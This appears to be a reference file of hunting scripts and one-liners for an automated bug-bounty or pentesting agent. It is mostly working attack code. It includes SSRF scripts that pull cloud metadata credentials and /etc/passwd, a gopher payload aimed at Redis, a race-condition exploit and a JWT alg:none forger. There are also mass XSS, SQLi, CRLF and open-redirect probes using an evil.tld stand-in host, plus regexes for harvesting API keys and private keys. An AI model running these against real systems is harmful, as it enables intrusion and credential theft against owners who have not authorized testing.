# AUTOMATION MODE — Hunting scripts, one-liners, regex (reference)

> Moved from automation-mode/SKILL.md during the 2026-09-19 playbook split. Load on demand only.

## Hunting Scripts — bash
```bash
# Subdomain enum → alive
subfinder -d $T -all -silent | tee subs.txt | httpx -silent -threads 100 -o alive.txt
# Quick top-hit asset shot
echo $T | subfinder -all -silent | dnsx -silent -a -resp-only | sort -u
# Mass status-code triage
cat urls.txt | httpx -status-code -title -tech-detect -threads 100 -silent -no-color | tee httpx.txt
# Wayback URL pull → dedup → param URLs
echo $T | gau --threads 10 --subs | sort -u | grep -E '\?[a-zA-Z0-9_]+=' > params.txt
# Common files probe
for p in /.git/config /.env /robots.txt /sitemap.xml /server-status /actuator/env /api/swagger.json; do
  while read u; do echo "$u$p"; done < alive.txt
done | httpx -silent -mc 200 -path-stats
# Extract endpoints from JS
cat alive.txt | katana -d 3 -jc -kf all -f endpoint -silent
cat alive.txt | hakrawler -d 3 -subs | sort -u
# CORS probe
while read u; do
  o=$(curl -sk -H "Origin: https://evil.tld" -I "$u" | grep -i 'access-control-allow-origin' )
  [ -n "$o" ] && echo "$u → $o"
done < alive.txt
# Quick subdomain takeover
subzy run --targets alive.txt --hide_fails --concurrency 100
nuclei -l alive.txt -t ~/nuclei-templates/http/takeovers/ -severity high,critical
# CRLF probe
while read u; do
  echo "$u/%0d%0aSet-Cookie:%20pwn=1" | xargs curl -sik | grep -i 'set-cookie:.*pwn' && echo "CRLF: $u"
done < urls.txt
# Open redirect probe
cat params.txt | qsreplace 'https://evil.tld' | httpx -silent -follow-redirects -mr 'evil.tld' | tee redirect.txt
```
Tips: `set -euo pipefail`, `xargs -P NUM -I {}`, `parallel :::`, pipe through `anew` to dedup.

## Hunting Scripts — python
```python
# Async HTTP probe
import asyncio, httpx, sys
SEM = asyncio.Semaphore(50)
async def probe(client, url):
    async with SEM:
        try:
            r = await client.get(url, timeout=7, follow_redirects=False)
            print(f"{r.status_code} {url} {r.headers.get('server','-')}", flush=True)
        except Exception as e: pass
async def main():
    urls = [l.strip() for l in sys.stdin if l.strip()]
    async with httpx.AsyncClient(verify=False, headers={'User-Agent':'Mozilla/5.0'}) as c:
        await asyncio.gather(*(probe(c,u) for u in urls))
asyncio.run(main())
```
```python
# Redirect/SSRF exfil
import requests
url = "https://target.tld/api/fetch?url={}"
payloads = [
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://[fd00:ec2::254]/latest/meta-data/",
    "http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=json",
    "file:///etc/passwd",
    "gopher://127.0.0.1:6379/_INFO%0d%0aQUIT%0d%0a",
]
for p in payloads:
    r = requests.get(url.format(p), headers={'Metadata-Flavor':'Google'}, timeout=10)
    if any(k in r.text for k in ['root:','SecretAccessKey','metadata']):
        print(f"HIT: {p}\n{r.text[:500]}")
```
```python
# Race condition (singlepacket-style)
import httpx, asyncio
async def hit(client):
    return await client.post('https://target/redeem', json={'code':'X'})
async def main():
    async with httpx.AsyncClient(http2=True, verify=False) as c:
        rs = await asyncio.gather(*(hit(c) for _ in range(30)))
    for r in rs: print(r.status_code, r.text[:80])
asyncio.run(main())
```
```python
# JWT forger (alg:none / weak HS256)
import jwt, json
header = {"alg": "none"}
payload = {"sub":"admin","exp":9999999999}
print(jwt.encode(payload, key="", algorithm="none"))
print(jwt.encode(payload, key="secret", algorithm="HS256"))
```
```python
# Burp replay helper
import re, requests
raw = open('request.txt').read()
m = re.match(r'(GET|POST|PUT|DELETE) (\S+) HTTP', raw)
method, path = m.groups()
host = re.search(r'Host: (\S+)', raw).group(1)
body = raw.split('\r\n\r\n',1)[1] if '\r\n\r\n' in raw else ''
url = f'https://{host}{path}'
headers = {l.split(': ',1)[0]: l.split(': ',1)[1] for l in raw.split('\r\n')[1:] if ': ' in l}
r = requests.request(method, url, data=body, headers=headers, verify=False)
print(r.status_code, len(r.text))
```

## Hunting Scripts — JS / Node
```javascript
// Puppeteer endpoint extraction
const puppeteer = require('puppeteer');
(async () => {
  const b = await puppeteer.launch({headless:'new', args:['--no-sandbox','--ignore-certificate-errors']});
  const p = await b.newPage();
  const urls = new Set();
  p.on('request', r => urls.add(r.url()));
  await p.goto(process.argv[2], {waitUntil:'networkidle2', timeout:30000});
  for (const u of urls) console.log(u);
  await b.close();
})();
```
```javascript
// DOM XSS helper (browser console)
[...document.querySelectorAll('a')]
  .filter(a => /javascript:|data:/i.test(a.href))
  .forEach(a => console.log(a.outerHTML));
['innerHTML','outerHTML','document.write','eval'].forEach(s => {
  console.log(s, document.body.outerHTML.match(new RegExp(s,'g'))?.length || 0);
});
// postMessage listener + probe
window.addEventListener('message', e => {
  console.log('FROM:', e.origin, 'DATA:', e.data, 'SOURCE:', e.source);
});
top.postMessage({pwn:1}, '*');
```
```javascript
// Node fast fuzzer
const fetch = require('node-fetch'); const fs = require('fs');
const wl = fs.readFileSync(process.argv[3]).toString().split('\n');
const tpl = process.argv[2];
const conc = 50;
let i = 0;
async function worker(){
  while (i < wl.length){
    const w = wl[i++];
    const u = tpl.replace('FUZZ', encodeURIComponent(w));
    try { const r = await fetch(u, {redirect:'manual'}); if (r.status === 200) console.log(r.status, u); } catch{}
  }
}
Promise.all(Array(conc).fill().map(worker));
// node fuzz.js 'https://target/FUZZ' wl.txt
```

## Hunting Scripts — Ruby
```ruby
# Concurrent probe
require 'net/http'; require 'uri'; require 'thread'
queue = Queue.new
STDIN.each_line { |l| queue << l.chomp }
threads = 50.times.map do
  Thread.new do
    until queue.empty?
      u = queue.pop(true) rescue break
      uri = URI(u)
      begin
        Net::HTTP.start(uri.host, uri.port, use_ssl: uri.scheme == 'https',
                        verify_mode: OpenSSL::SSL::VERIFY_NONE, open_timeout: 5, read_timeout: 7) do |http|
          r = http.get(uri.path.empty? ? '/' : uri.path)
          puts "#{r.code} #{u}"
        end
      rescue
      end
    end
  end
end
threads.each(&:join)
```
```ruby
# Metasploit module starter — ~/.msf4/modules/auxiliary/scanner/http/my_check.rb
class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner
  def initialize
    super('Name'=>'My Check', 'Description'=>'...', 'License'=>MSF_LICENSE)
  end
  def run_host(ip)
    res = send_request_cgi('uri'=>'/admin', 'method'=>'GET')
    print_good("FOUND: #{ip}") if res && res.code == 200
  end
end
```

## Hunting Tools — Go
```go
// Subdomain brute resolver — build: go build -o resolve resolve.go ; use: cat candidates.txt | ./resolve
package main
import ("bufio";"fmt";"net";"os";"sync")
func main() {
    sem := make(chan struct{}, 200); var wg sync.WaitGroup
    s := bufio.NewScanner(os.Stdin)
    for s.Scan() {
        host := s.Text()
        sem <- struct{}{}; wg.Add(1)
        go func(h string) {
            defer wg.Done(); defer func(){<-sem}()
            ips, err := net.LookupHost(h)
            if err == nil && len(ips) > 0 { fmt.Println(h) }
        }(host)
    }
    wg.Wait()
}
```
```go
// Concurrent GET
package main
import ("bufio";"crypto/tls";"fmt";"net/http";"os";"sync";"time")
func main(){
    tr := &http.Transport{TLSClientConfig:&tls.Config{InsecureSkipVerify:true}}
    cl := &http.Client{Timeout:7*time.Second, Transport:tr,
        CheckRedirect: func(req *http.Request, via []*http.Request) error { return http.ErrUseLastResponse }}
    sem := make(chan struct{},100); var wg sync.WaitGroup
    s:=bufio.NewScanner(os.Stdin)
    for s.Scan(){ u:=s.Text(); sem<-struct{}{}; wg.Add(1)
        go func(u string){defer wg.Done(); defer func(){<-sem}()
            r,e:=cl.Get(u); if e!=nil{return}; defer r.Body.Close()
            fmt.Printf("%d %s %s\n",r.StatusCode,u,r.Header.Get("Server"))
        }(u)}
    wg.Wait()
}
```
Build env: `go mod init hunter`; `go build -ldflags="-s -w" -o tool tool.go`; `GOOS=linux GOARCH=amd64 go build`.

## Hunting Tools — Rust
```rust
// Cargo.toml: tokio = { version = "1", features = ["full"] }, reqwest = { version = "0.12", features = ["rustls-tls"] }, futures = "0.3"
use std::io::{self, BufRead}; use futures::stream::{StreamExt, FuturesUnordered}; use reqwest::Client;
#[tokio::main]
async fn main() {
    let client = Client::builder().danger_accept_invalid_certs(true).build().unwrap();
    let urls: Vec<String> = io::stdin().lock().lines().filter_map(|l| l.ok()).collect();
    let mut futs = FuturesUnordered::new();
    for u in urls {
        let c = client.clone();
        futs.push(async move {
            match c.get(&u).send().await {
                Ok(r) => println!("{} {}", r.status().as_u16(), u),
                Err(_) => {}
            }
        });
        if futs.len() > 50 { futs.next().await; }
    }
    while futs.next().await.is_some() {}
}
```
Use Rust for CPU-bound work (regex, parsing, crypto), single static binaries, memory-safe daemons; beats Go on tight loops. Examples: noseyparker (secrets), feroxbuster (discovery), rustscan (port scanner).

## One-Liners (verbatim)
```bash
# All-in-one passive sub enum
echo $T | (subfinder -all -silent; assetfinder; chaos -silent) | sort -u
# Cert SAN extraction
curl -sk https://$T --connect-timeout 5 | openssl s_client -servername $T -connect $T:443 </dev/null 2>/dev/null | openssl x509 -noout -text | grep -oE 'DNS:[^ ,]+' | tr -d 'DNS:'
# Wayback URL fetch + dedup
curl -sk "http://web.archive.org/cdx/search/cdx?url=*.$T/*&output=text&fl=original&collapse=urlkey" | sort -u
# JS endpoint dump
curl -sk $URL | grep -oE 'https?://[^"\\']+|/[a-zA-Z0-9_/.-]+' | sort -u
# Subdomain takeover quick check
for s in $(cat subs.txt); do
  curl -sk -o /dev/null -w "%{http_code} $s\n" $s --connect-timeout 5 | grep -E '404 .*\.(s3\.amazonaws|github\.io|herokuapp|azurewebsites)'
done
# Mass open redirect probe
cat urls.txt | qsreplace 'https://evil.tld' | xargs -I{} -P50 sh -c 'curl -sIk {} | grep -i "Location: https://evil.tld" && echo "REDIR: {}"'
# Mass SSRF probe (with interactsh)
SUBDOMAIN=$(interactsh-client -n 1 -ps | head -1)
cat urls.txt | qsreplace "http://$SUBDOMAIN" | xargs -I{} -P50 curl -sk -o /dev/null {}
# Mass XSS probe
cat urls.txt | qsreplace '"><svg onload=alert(1)>' | xargs -I{} -P50 sh -c 'curl -sk {} | grep -E "svg onload=alert" && echo "XSS-REF: {}"'
# Mass SQLi quote-error probe
cat urls.txt | qsreplace "'" | xargs -I{} -P50 sh -c 'curl -sk {} | grep -E "syntax|MySQL|mysqli|PostgreSQL|ORA-|sqlite" && echo "SQLI?: {}"'
# Top 50 fastest content discovery (recursive)
ffuf -u https://$T/FUZZ -w ~/wordlists/SecLists/Discovery/Web-Content/raft-large-directories.txt -mc all -fc 404 -ac -e .php,.html,.json,.bak,.zip,.tar.gz,.git -recursion -recursion-depth 2 -t 50
# Burp known-good fuzz wordlist
ffuf -u "https://$T/?FUZZ=test" -w ~/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt -mc 200 -ac
# Add only new
cat new.txt | anew known.txt
# Sort + uniq + length
sort | uniq -c | sort -rn | head -20
# Get domains only
unfurl -u domains
# Get params only
unfurl -u keys
```

## Regex Patterns for Hunting
Secrets:
```regex
# AWS
AKIA[0-9A-Z]{16}
ASIA[0-9A-Z]{16}
aws_secret_access_key.{0,30}['"][A-Za-z0-9/+=]{40}['"]
# GitHub
gh[pousr]_[A-Za-z0-9]{36,}
github_pat_[a-zA-Z0-9_]{82}
# Google
AIza[0-9A-Za-z_-]{35}
ya29\.[0-9A-Za-z_-]+
# Slack
xox[baprs]-[0-9a-zA-Z-]+
# Stripe
sk_live_[0-9a-zA-Z]{24,}
rk_live_[0-9a-zA-Z]{24,}
# Twilio
SK[0-9a-fA-F]{32}
AC[0-9a-fA-F]{32}
# SendGrid
SG\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43}
# Mailgun
key-[0-9a-zA-Z]{32}
# Square
sq0atp-[0-9A-Za-z_-]{22}
sq0csp-[0-9A-Za-z_-]{43}
# JWT
eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+
# Private key
-----BEGIN ((RSA|DSA|EC|OPENSSH|PRIVATE) )?PRIVATE KEY-----
```
Endpoints in JS:
```regex
['"]\/[a-zA-Z0-9_/.-]{2,}['"]
['"]\/api\/v?\d+\/[a-zA-Z0-9_/.-]+['"]
['"]\/graphql['"]
[?&](?:token|api_key|apikey|access_token|key)=([^&\s'"]+)
```
Emails / domains:
```regex
[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}
([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}
```
Dangerous sinks (JS):
```regex
\b(eval|Function|setTimeout|setInterval)\s*\(
\.(innerHTML|outerHTML|insertAdjacentHTML)\s*=
document\.(write|writeln)\s*\(
location(\.href)?\s*=
```
Usage:
```bash
rg -nE 'AKIA[0-9A-Z]{16}' .
cat patterns.txt | xargs -I{} rg -nE '{}' .
curl -sk $URL | grep -oE 'AKIA[0-9A-Z]{16}|ghp_[A-Za-z0-9]{36}'
```
